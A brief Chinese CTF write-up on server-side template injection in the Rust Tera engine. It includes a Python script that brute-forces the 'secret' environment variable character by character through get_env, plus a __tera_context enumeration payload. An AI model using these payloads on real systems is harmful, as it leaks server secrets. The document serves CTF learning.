## 考点

SSTI模板注入，rust Tera模板引擎内置函数。

## 工具

python环境

## 步骤

```python
import requests

url = "http://123.57.4.116:19726/"
flag = ['']*40

def replace(s:str):
    return s.replace("<","{%").replace(">","%}")

payload ="< for v in get_env(name=\"secret\") >< if v == \'{0}\' >1< else >0< endif >< endfor >"

for i in range(32,128):
    r=requests.post(url=url,data=replace(payload.format(chr(i))))
    content=r.text
    for j in range(len(content)):
        if content[j] == '1':
            flag[j]=chr(i)

for i in range(40):
    print(flag[i],end='')
```

```
#{% for v  in __tera_context %}{% if v == 'x' %}1{% else %}0{% endif %}{% endfor %}
```



## 总结

难点主要在于黑盒不知道用了什么框架，但几天后放出了hint。

考察了学习新知的能力，找到获取环境变量的函数是关键。